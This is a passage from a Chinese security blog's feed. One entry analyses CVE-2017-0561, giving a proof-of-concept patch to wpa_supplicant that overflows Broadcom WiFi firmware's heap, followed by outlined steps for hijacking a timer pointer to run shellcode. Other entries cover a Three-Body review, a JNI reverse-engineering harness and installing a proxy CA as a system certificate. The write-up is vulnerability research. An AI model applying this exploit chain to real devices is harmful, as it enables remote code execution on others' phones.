<h2 id="Patch-文件"><a href="#Patch-文件" class="headerlink" title="Patch 文件"></a>Patch 文件</h2><p>这份 patch 文件 就是一个 poc, 通过修改 wpa_supplicant 代码，在构造 teardown 请求包时，故意让 ftie 指向的堆比接受的256 字节大。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">--- wpa_supplicant-2.6/src/rsn_supp/tdls.c     2016-10-02 19:51:11.000000000 +0100</div><div class="line">+++ TDLSTeardownModification/wpa_supplicant-2.6/src/rsn_supp/tdls.c     2016-12-19 12:15:28.000000000 +0000</div><div class="line">@@ -765,15 +765,7 @@</div><div class="line">     wpa_printf(MSG_DEBUG, &quot;TDLS: TDLS Teardown for &quot; MACSTR,</div><div class="line">             MAC2STR(addr));</div><div class="line"></div><div class="line">// 删除计算 ielen 的代码， 这里是用来计算 ftie 堆的大小</div><div class="line">-     ielen = 0;</div><div class="line">-     if (wpa_tdls_get_privacy(sm) &amp;&amp; peer-&gt;tpk_set &amp;&amp; peer-&gt;tpk_success) &#123;</div><div class="line">-          /* To add FTIE for Teardown request and compute MIC */</div><div class="line">-          ielen += sizeof(*ftie);</div><div class="line">-#ifdef CONFIG_TDLS_TESTING</div><div class="line">-          if (tdls_testing &amp; TDLS_TESTING_LONG_FRAME)</div><div class="line">-               ielen += 170;</div><div class="line">-#endif /* CONFIG_TDLS_TESTING */</div><div class="line">-     &#125;</div><div class="line">+     ielen = 257;        // 溢出1个字节</div><div class="line"></div><div class="line">     rbuf = os_zalloc(ielen + 1);</div><div class="line">     if (rbuf == NULL)</div><div class="line">@@ -785,11 +777,14 @@</div><div class="line"></div><div class="line">     ftie = (struct wpa_tdls_ftie *) pos;</div><div class="line">     ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;</div><div class="line">+     ftie-&gt;ie_len = 255;            // 忽略了 wpa_tdls_ftie 头部2个字节。实际在计算 mic 时，读取的是 257 个字节。</div><div class="line">+     os_memset(pos + 2, 0xFF, 255);</div><div class="line">+</div><div class="line">     /* Using the recent nonce which should be for CONFIRM frame */</div><div class="line">     os_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);</div><div class="line">     os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);</div><div class="line">-     ftie-&gt;ie_len = sizeof(struct wpa_tdls_ftie) - 2;</div><div class="line">-     pos = (u8 *) (ftie + 1);</div><div class="line">+</div><div class="line">+     pos += 257;</div><div class="line">#ifdef CONFIG_TDLS_TESTING</div><div class="line">     if (tdls_testing &amp; TDLS_TESTING_LONG_FRAME) &#123;</div><div class="line">          wpa_printf(MSG_DEBUG, &quot;TDLS: Testing - add extra subelem to &quot;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">struct wpa_tdls_ftie &#123;</div><div class="line">     u8 ie_type; /* FTIE */</div><div class="line">     u8 ie_len;        // 这里会 忽略头2个字节</div><div class="line">     u8 mic_ctrl[2];</div><div class="line">     u8 mic[TDLS_MIC_LEN];  //TDLS_MIC_LEN  16</div><div class="line">     u8 Anonce[WPA_NONCE_LEN]; /* Responder Nonce in TDLS */   WPA_NONCE_LEN 32</div><div class="line">     u8 Snonce[WPA_NONCE_LEN]; /* Initiator Nonce in TDLS */</div><div class="line">     /* followed by optional elements */</div><div class="line">&#125; STRUCT_PACKED;</div></pre></td></tr></table></figure>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>我已经能够在BCM4339芯片上验证此漏洞，运行版本为6.37.34.40（如Nexus 5所示）。不过，我相信这个漏洞的范围包括更广泛的Broadcom SoC和版本。</p>
<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>直接 运行exploit.py  可以在 WiFi  加密狗上 任意代码执行。</p>
<p>配置步骤：</p>
<ol>
<li>和目标设备创建 TDLS 链接</li>
<li>发送构造的 teardown 请求给目标，触发堆溢出漏洞</li>
<li>创建一个新的 TDLS 链接，使用精心设计的参数，导致空闲链表中的一个chunk覆盖另一个chunk ？？？</li>
<li>发送 action code == 127 的 TDLS 请求帧<ol>
<li>精心构造 TDLS 请求帧的大小，要让其和空闲链表中另一个 chunk 发生覆盖</li>
<li>精心构造 请求数据，保证 free chunk 的指针指向，固件初始化时创建的定时器</li>
</ol>
</li>
<li>发送另一个 action code == 127 的 TDLS 请求帧<ol>
<li>精心构造 TDLS 请求帧的大小，这个帧将被放置在 定时器的头部 （因为再次 malloc 时，返回的是定时器的内存地址）</li>
<li>精心构造 请求数据，保证我们能覆盖定时器的函数指针，这里我们将指针指向堆结尾处。</li>
</ol>
</li>
<li>发送一个 action code == 127 的较大 TDLS 请求帧<ol>
<li>精心构造 请求数据，使其包含我们要执行的 shellcode</li>
</ol>
</li>
<li>由于堆内存分配以后都会被初始化为0， 而“Thumb”中为“00 00”为NOP（MOVS R0，R0），这就是天然的滑板指令。所以我们跳到shellcode 之前的位置，不会有任何影响。<br>整个攻击，会在下一次定时器到期，在固件上执行我们的 shellcode。</li>
</ol>
<!--
### 好消息
因为 高通生产的 wifi soc 可以独立处理 物理层和链路层的工作，不需要 OS 参与。所以在单独的芯片上不会受到 SMEP、PXN、NX 等防护措施的影响。可以在堆上执行 shellcode。
-->
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-4-21</td>
<td>测试 android N5</td>
</tr>
<tr>
<td></td>
<td>测试 ios &lt;=10.3</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Title: &lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=1046&quot;&gt;CVE-2017-0561 issues&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Core Skill：远程攻击 wpa_supplicant wifi 模块, 存在堆溢出漏洞,精心构造数据可以远程提权。&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="pi" scheme="http://yoursite.com/tags/pi/"/>
    
  </entry>
  
  <entry>
    <title>《三体》</title>
    <link href="http://yoursite.com/2017/04/19/%E3%80%8A%E4%B8%89%E4%BD%93%E3%80%8B/"/>
    <id>http://yoursite.com/2017/04/19/《三体》/</id>
    <published>2017-04-19T08:05:17.000Z</published>
    <updated>2017-05-23T13:14:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>人类对抗挫折，再强大的对手都有解决的办法。解决不了就说明有 思维的局限，就类似三体-1中举得栗子，农场主假说 &amp; 射手理论, 说明自然界的个体 容易被 经验 和 自身的认知 带入陷阱中。<br><a id="more"></a></p>
<p><code>三体-I-基石</code>，看完以后感觉良好。但是从 I 过渡到 <code>II-黑暗森林 上部(面壁者)</code>的时候突然出现了几个人，而且文章的内容也突然变换了场景感觉很不适应。<br>这可能就是 资生读者口中的”牛逼科幻”, 据说这样的书还有很多比如：攻壳(qiao)机动队。</p>
<p>于是 再次将那个80多分钟的视频剪辑看了一遍，看完 <code>黑暗森林</code>就不敢继续向下看了，已经开始看不懂了。</p>
<p>看完了大概30分钟的剧情，最后到 “罗辑给自己挖好坟墓，然后做出了竟然的举动，他要挟三体人要炸太阳将太阳系的坐标发送到全宇宙。”这<br>里就是小说的第一个高潮部分，这是人类第一次和三体人对话中占据上风。<br>总结一下我印象最深刻的感受：</p>
<blockquote>
<p>人类对抗挫折，再强大的对手都有解决的办法。解决不了就说明有 思维的局限，就类似三体-1中举得栗子–农场主假说 &amp; 射手理论, 说明自然界的个体 容易被 经验 和 自身的认知 带入陷阱中。</p>
</blockquote>
<p><a href="https://www.zhihu.com/question/31245113" target="_blank" rel="external">https://www.zhihu.com/question/31245113</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;人类对抗挫折，再强大的对手都有解决的办法。解决不了就说明有 思维的局限，就类似三体-1中举得栗子，农场主假说 &amp;amp; 射手理论, 说明自然界的个体 容易被 经验 和 自身的认知 带入陷阱中。&lt;br&gt;
    
    </summary>
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="小说" scheme="http://yoursite.com/tags/%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>玩转 android 虚拟机</title>
    <link href="http://yoursite.com/2017/04/19/%E6%95%99%E7%A8%8B/%E7%8E%A9%E8%BD%AC-android-%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <id>http://yoursite.com/2017/04/19/教程/玩转-android-虚拟机/</id>
    <published>2017-04-19T07:38:47.000Z</published>
    <updated>2017-05-23T13:23:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Title: <a href="https://calebfenton.github.io/2017/04/14/calling_jni_functions_with_java_object_arguments_from_the_command_line/" target="_blank" rel="external">Calling JNI Functions with Java Object Arguments from the Command Line</a></p>
<p>Core Skill: 在 native 层创建 Android 虚拟机，并调用 jni 方法。</p>
<p><a href="https://calebfenton.github.io/" target="_blank" rel="external">Caleb Fenton’s Blog</a>中包含很多关于 android 开发的技术，特别是虚拟机相关的技术。<strong>介绍的非常详细</strong></p>
<a id="more"></a>
<p>这里介绍 <a href="https://calebfenton.github.io" target="_blank" rel="external">Caleb Fenton’s Blog</a>中关于 Android 虚拟机的系列文章，对文章中的技术做汇总和实验。</p>
<p>目前作者给出了 如下2篇文章：</p>
<ul>
<li><a href="https://calebfenton.github.io/2017/04/05/creating_java_vm_from_android_native_code/" target="_blank" rel="external">Creating a Java VM from Android Native Code</a><br>介绍如何通过编写 Native 可执行文件，创建Android VM；本质就是调用 libdvm.so 中未开放的代码。</li>
<li><a href="https://calebfenton.github.io/2017/04/14/calling_jni_functions_with_java_object_arguments_from_the_command_line/" target="_blank" rel="external">Calling JNI Functions with Java Object Arguments from the Command Line</a></li>
</ul>
<p>重点介绍第二篇 文章， 因为第一篇只是一个技术基础。第二篇包含了一些案例 更有价值一些。</p>
<h1 id="从-navice-层创建-Android-VM"><a href="#从-navice-层创建-Android-VM" class="headerlink" title="从 navice 层创建 Android VM"></a>从 navice 层创建 Android VM</h1><p>在介绍第二篇之前先将第一篇公布的完整代码公布出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*JNI_CreateJavaVM_t)</span><span class="params">(<span class="keyword">void</span> *, <span class="keyword">void</span> *, <span class="keyword">void</span> *)</span></span>;</div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">jint</span> <span class="params">(*registerNatives_t)</span><span class="params">(JNIEnv* env, jclass clazz)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init_jvm</span><span class="params">(JavaVM **p_vm, JNIEnv **p_env)</span> </span>&#123;</div><div class="line">    <span class="comment">// https://android.googlesource.com/platform/frameworks/native/+/ce3a0a5/services/surfaceflinger/DdmConnection.cpp</span></div><div class="line">    JavaVMOption opt[<span class="number">4</span>];</div><div class="line">    opt[<span class="number">0</span>].optionString = <span class="string">"-Djava.class.path=/data/local/tmp/shim_app.apk"</span>;</div><div class="line">    opt[<span class="number">1</span>].optionString = <span class="string">"-agentlib:jdwp=transport=dt_android_adb,suspend=n,server=y"</span>;</div><div class="line">    opt[<span class="number">2</span>].optionString = <span class="string">"-Djava.library.path=/data/local/tmp"</span>;</div><div class="line">    opt[<span class="number">3</span>].optionString = <span class="string">"-verbose:jni"</span>; <span class="comment">// may want to remove this, it's noisy</span></div><div class="line">    JavaVMInitArgs args;</div><div class="line">    args.version = JNI_VERSION_1_6;</div><div class="line">    args.options = opt;</div><div class="line">    args.nOptions = <span class="number">4</span>;</div><div class="line">    args.ignoreUnrecognized = JNI_FALSE;</div><div class="line">    <span class="keyword">void</span> *libdvm_dso = dlopen(<span class="string">"libdvm.so"</span>, RTLD_NOW);</div><div class="line">    <span class="keyword">void</span> *libandroid_runtime_dso = dlopen(<span class="string">"libandroid_runtime.so"</span>, RTLD_NOW);</div><div class="line">    <span class="keyword">if</span> (!libdvm_dso || !libandroid_runtime_dso) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    JNI_CreateJavaVM_t JNI_CreateJavaVM;</div><div class="line">    JNI_CreateJavaVM = (JNI_CreateJavaVM_t) dlsym(libdvm_dso, <span class="string">"JNI_CreateJavaVM"</span>);</div><div class="line">    <span class="keyword">if</span> (!JNI_CreateJavaVM) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</div><div class="line">    &#125;</div><div class="line">    registerNatives_t registerNatives;</div><div class="line">    registerNatives = (registerNatives_t) dlsym(libandroid_runtime_dso, <span class="string">"Java_com_android_internal_util_WithFramework_registerNatives"</span>);</div><div class="line">    <span class="keyword">if</span> (!registerNatives) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (JNI_CreateJavaVM(&amp;(*p_vm), &amp;(*p_env), &amp;args)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-4</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (registerNatives(*p_env, <span class="number">0</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-5</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="在命令行调用-JNI-函数（参数可以包括-Java-对象）"><a href="#在命令行调用-JNI-函数（参数可以包括-Java-对象）" class="headerlink" title="在命令行调用 JNI 函数（参数可以包括 Java 对象）"></a>在命令行调用 JNI 函数（参数可以包括 Java 对象）</h1><p>当破解或者分析恶意代码时，可能关键的值（字符串）是在 Native层计算出来的，这时候我们有几种办法获取native 函数的返回值。</p>
<ol>
<li>hook native函数   [简单、不稳定、不方便]</li>
<li>静态分析 native 函数算法，重写方法    [复杂]</li>
<li>动态调试     [更不方便]</li>
<li>插桩         [不方便、校验完整性的防护]</li>
<li>创建一个可执行文件，加载目标 so 调用目标函数。通过命令行传递参数给目标函数。     [简单、有局限（无法创建 JNIEnv参数）]</li>
<li>….</li>
</ol>
<p>下面我们会介绍 本文的技术来解决这个调用 jni 函数的问题。</p>
<p>首先下载我们的<a href="https://github.com/CalebFenton/native-harness-target" target="_blank" rel="external">实验app</a>, 使用下面的方法编译 apk.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CalebFenton/native-harness-target.git</div><div class="line">cd native-harness-target</div><div class="line">echo &apos;ndk.dir=$ANDROID_NDK&apos; &gt; local.properties</div><div class="line">echo &apos;sdk.dir=$ANDROID_SDK&apos; &gt;&gt; local.properties</div><div class="line">./gradlew build</div></pre></td></tr></table></figure></p>
<p>APKs 输出目录：<code>app/build/outputs/apk/</code>。</p>
<p>实验的设备：Nexus5<br>系统版本：android 6.0.1</p>
<h2 id="Harness-服务端工具"><a href="#Harness-服务端工具" class="headerlink" title="Harness 服务端工具"></a>Harness 服务端工具</h2><p>Harness的灵感来自 shim项目，shim 的功能是加载 library 并调用其 JNI_OnLoad 函数。这样就简化了调试工作，现在只需要让调试器去启动 shim 并通过参数传递要目标 library，然后使用调试器下断点并 绕过 JNI_OnLoad。</p>
<p>首先我们需要使用上一节介绍的技术，在 native 层创建 java vm，并将 JavaVM 实例传递给 JNI_OnLoad 函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">" [+] Initializing JavaVM Instance\n"</span>);</div><div class="line">JavaVM *vm = <span class="literal">NULL</span>;</div><div class="line">JNIEnv *env = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">int</span> status = init_jvm(&amp;vm, &amp;env);</div><div class="line"><span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">" [+] Initialization success (vm=%p, env=%p)\n"</span>, vm, env);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">" [!] Initialization failure (%i)\n"</span>, status);</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">" [+] Calling JNI_OnLoad\n"</span>);</div><div class="line">onLoadFunc(vm, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<p>最终在代码中开启一个 socket， 通过这个 socket 读取参数作为目标函数的参数。使用 python 脚本可以很容易与它进行交互。</p>
<p>python 脚本就是 在PC 上执行的 <strong>客户端</strong>了。</p>
<h2 id="逆向-Dex"><a href="#逆向-Dex" class="headerlink" title="逆向 Dex"></a>逆向 Dex</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">.local v1, "encryptedStringBytes":[B</div><div class="line">invoke-static &#123;&#125;, Lorg/cf/nativeharness/Cryptor;-&gt;getInstance()Lorg/cf/nativeharness/Cryptor;</div><div class="line">move-result-object v0</div><div class="line"></div><div class="line">.line 21</div><div class="line">.local v0, "c":Lorg/cf/nativeharness/Cryptor;</div><div class="line"></div><div class="line"># v3 contains a String made from encrypted bytes</div><div class="line">new-instance v3, Ljava/lang/String;</div><div class="line">invoke-direct &#123;v3, v1&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</div><div class="line"></div><div class="line"># Call the decryption method, move result back to v3</div><div class="line">invoke-virtual &#123;v0, v3&#125;, Lorg/cf/nativeharness/Cryptor;-&gt;decryptString(Ljava/lang/String;)Ljava/lang/String;</div><div class="line"></div><div class="line">move-result-object v3</div></pre></td></tr></table></figure>
<p>注意：这里调用 native 函数的指令是<code>invoke-virtual</code>, 这个指令一般用来调用实例方法，虚方法等。指令的第一个参数就是 class 实例。</p>
<p>注意：native 方法 和 <code>invoke-virtual</code> 没有直接联系。存在 static native 的方法，这时候使用<code>invoke-static</code>，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">private static native void post_arm64Load0(Library this, long arg1) &#123;</div><div class="line">    &#125;</div><div class="line">.method private static native post_arm64Load0(J)V</div><div class="line">.end method</div><div class="line"></div><div class="line"></div><div class="line">调用代码</div><div class="line">00000060  iget-wide               v2, v0, Library-&gt;a:J</div><div class="line">00000064  invoke-static           Library-&gt;post_arm64Load0(J)V, v2, v3</div></pre></td></tr></table></figure></p>
<hr>
<p>下一步 我们要查看目标 jni 函数的签名，两种方法：</p>
<ol>
<li>通过反编译 so</li>
<li>但是方法1有可能 so 做了加固，查看不到函数签名；所以要使用 javah 生成头文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ d2j-dex2jar.sh app-universal-debug.apk</div><div class="line">dex2jar app-universal-debug.apk -&gt; ./app-universal-debug-dex2jar.jar</div><div class="line">$ javah -cp app-universal-debug-dex2jar.jar:$ANDROID_SDK/platforms/android-19/android.jar org.cf.nativeharness.Cryptor</div></pre></td></tr></table></figure>
</li>
</ol>
<p>jni 函数前2个参数是固定的，从第3个参数开始是应用的参数。<br>这个 jobject 参数应该是 <code>org.cf.nativeharness.Cryptor</code>实例，实际的函数签名：<br><code>JNIEXPORT jstring JNICALL Java_org_cf_nativeharness_Cryptor_decryptString (JNIEnv *, jobject, jstring);</code></p>
<p>定义目标函数类型：<br><code>typedef jstring(*decryptString_t)(JNIEnv *, jobject, jstring);</code></p>
<h2 id="定义一个-server-socket"><a href="#定义一个-server-socket" class="headerlink" title="定义一个 server socket"></a>定义一个 server socket</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><pre><code>1. 将目标 apk（或者 Dex、Jar）放在`/data/local/tmp/target-app.apk`,创建 VM 时的参数(`-Djava.class.path=/data/local/tmp/target-app.apk`)
2. 将需要的 native 库放在 `/data/local/tmp` (`-Djava.library.path=/data/local/tmp`)
3. 使用客户端  python 脚本时，需要 adb forward tcp:5001 tcp:5001
</code></pre><p>harness.c 文件主要负责：</p>
<ol>
<li>加载目标native 动态库</li>
<li>调用 native 中的 JNI_OnLoad 函数</li>
<li>创建 VM 虚拟机，加载目标 Dex 和 libs</li>
<li>[可选] 如果不是 <code>static native</code> 方法，需要创建实例对象 jobject, 如果是 static 方法可以给 jobject 传递 NULL.</li>
<li>开启 TCP socket server （5001端口）</li>
</ol>
<p>server.c 文件功能：</p>
<ol>
<li>绑定 TCP 服务到5001 端口， 负责从客户端接受 参数传递个解密函数。</li>
</ol>
<h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>harness  <libxx.so>   开启服务<br>decrypt_string.py</libxx.so></p>
<p>介绍完整个使用流程，第一感觉就是复杂,每次添加目标函数都要重新编译 harness,还不如 直接 frida-hook。确实，这种方法的好处是 适合解密量较大的情况。</p>
<p>如果要是换个 apk 破解，需要修改流程：</p>
<ol>
<li>找到要调用的 jni 函数，参看签名信息（是否需要创建 jobject）</li>
<li>[可选]在 harness.c 中 创建 class 实例</li>
<li>server.c 中修改 调用目标函数的代码。<br>注释不要删。。</li>
</ol>
<p>测试阶段：</p>
<ol>
<li>编译 apk 。。。</li>
</ol>
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-4-19</td>
<td>创建</td>
</tr>
<tr>
<td></td>
<td>测试 art 模式</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Title: &lt;a href=&quot;https://calebfenton.github.io/2017/04/14/calling_jni_functions_with_java_object_arguments_from_the_command_line/&quot;&gt;Calling JNI Functions with Java Object Arguments from the Command Line&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Core Skill: 在 native 层创建 Android 虚拟机，并调用 jni 方法。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://calebfenton.github.io/&quot;&gt;Caleb Fenton’s Blog&lt;/a&gt;中包含很多关于 android 开发的技术，特别是虚拟机相关的技术。&lt;strong&gt;介绍的非常详细&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="public intelligence" scheme="http://yoursite.com/tags/public-intelligence/"/>
    
  </entry>
  
  <entry>
    <title>Andorid 添加系统证书</title>
    <link href="http://yoursite.com/2017/04/10/Andorid-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6/"/>
    <id>http://yoursite.com/2017/04/10/Andorid-添加系统证书/</id>
    <published>2017-04-10T09:45:01.000Z</published>
    <updated>2017-04-27T03:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>在 Android 上抓 HTTPs 的数据包，即使手动导入了证书还是无法 潇洒的抓包，应为手动导入的证书是用户证书，而不是系统证书。<br><a id="more"></a></p>
<p>因为没有 逆向分析 证书管理 apk 的代码，所以我只能推测 用户态证书会被递归检测 CA 颁发机构，如果根证书不是 系统证书中标准 CA 颁发的，那么在设置代理的环境下访问 https 服务就会一直谈窗提醒证书不可信。</p>
<h3 id="正题-–-导入系统证书"><a href="#正题-–-导入系统证书" class="headerlink" title="正题 – 导入系统证书"></a>正题 – 导入系统证书</h3><p>1.下载证书 <a href="https://www.charlesproxy.com/assets/legacy-ssl/charles.crt" target="_blank" rel="external">charles.crt</a></p>
<p>2.push 证书到 <code>/system/etc/security/cacerts/</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#pc 上操作</span></div><div class="line">adb push  xx/xx/charles.crt  /data/<span class="built_in">local</span>/tmp</div><div class="line"></div><div class="line"><span class="comment">#mobile   上操作</span></div><div class="line">adb shell</div><div class="line">su     <span class="comment">#获取 root</span></div><div class="line">mount -o remount,rw /system</div><div class="line">cp  /data/<span class="built_in">local</span>/tmp/charles.crt   /system/etc/security/cacerts</div></pre></td></tr></table></figure></p>
<p>3.修改文件权限<br>chmod  777 /system/etc/security/cacerts/charles.crt</p>
<p>最后 在手机的证书管理工具中查看就 OK 了</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;在 Android 上抓 HTTPs 的数据包，即使手动导入了证书还是无法 潇洒的抓包，应为手动导入的证书是用户证书，而不是系统证书。&lt;br&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
      <category term="抓包" scheme="http://yoursite.com/tags/%E6%8A%93%E5%8C%85/"/>
    
      <category term="https" scheme="http://yoursite.com/tags/https/"/>
    
  </entry>
  
  <entry>
    <title>Frida Hook 操作手册</title>
    <link href="http://yoursite.com/2017/04/10/%E5%BC%80%E5%8F%91/frida%20hook%20%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2017/04/10/开发/frida hook 操作手册/</id>
    <published>2017-04-10T09:45:01.000Z</published>
    <updated>2017-05-23T13:33:32.000Z</updated>
    
